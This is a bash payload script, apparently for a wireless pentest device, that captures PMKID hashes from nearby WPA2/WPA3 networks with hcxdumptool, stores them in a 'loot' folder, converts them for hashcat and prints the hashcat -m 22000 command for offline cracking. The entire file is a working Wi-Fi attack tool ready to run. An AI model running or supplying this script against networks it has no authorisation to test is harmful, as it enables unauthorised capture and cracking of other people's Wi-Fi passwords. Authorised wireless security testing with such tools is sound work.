#!/bin/bash
# Title: PMKID Capture
# Author: bad-antics
# Description: Capture PMKID hashes for offline cracking
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/pmkid"
mkdir -p "$LOOT_DIR"

PROMPT "PMKID CAPTURE

Capture PMKID hashes using
hcxdumptool. Works WITHOUT
any clients connected!

Captured hashes can be
cracked with hashcat -m 22000

Press OK to configure."

# Check for hcxdumptool
if ! command -v hcxdumptool >/dev/null 2>&1; then
    ERROR_DIALOG "hcxdumptool not found!

Install from packages:
opkg install hcxdumptool"
    exit 1
fi

# Need raw wifi interface (not monitor)
CAPTURE_IF="wlan1"
[ ! -d "/sys/class/net/$CAPTURE_IF" ] && CAPTURE_IF="wlan0"

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START PMKID CAPTURE?

Interface: $CAPTURE_IF
Duration: ${DURATION}s

Attacks WPA2/WPA3 networks
without needing clients.

Press OK to capture.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
PCAPNG_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.pcapng"
HASH_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.22000"

LOG "Starting PMKID capture..."

# Stop monitor mode if active
airmon-ng stop "${CAPTURE_IF}mon" 2>/dev/null

timeout "$DURATION" hcxdumptool -i "$CAPTURE_IF" -o "$PCAPNG_FILE" --active_beacon --enable_status=15 2>&1 &
wait $!

# Re-enable monitor
airmon-ng start "$CAPTURE_IF" 2>/dev/null

HASH_COUNT=0
if [ -f "$PCAPNG_FILE" ] && [ -s "$PCAPNG_FILE" ]; then
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "$HASH_FILE" "$PCAPNG_FILE" 2>/dev/null
        [ -f "$HASH_FILE" ] && HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
    fi
fi

PROMPT "PMKID CAPTURE COMPLETE

Hashes captured: $HASH_COUNT
PCAPNG: $PCAPNG_FILE
$([ -f "$HASH_FILE" ] && echo "Hashes: $HASH_FILE")

Crack with:
hashcat -m 22000 hashes.22000 wordlist.txt

Press OK to exit."
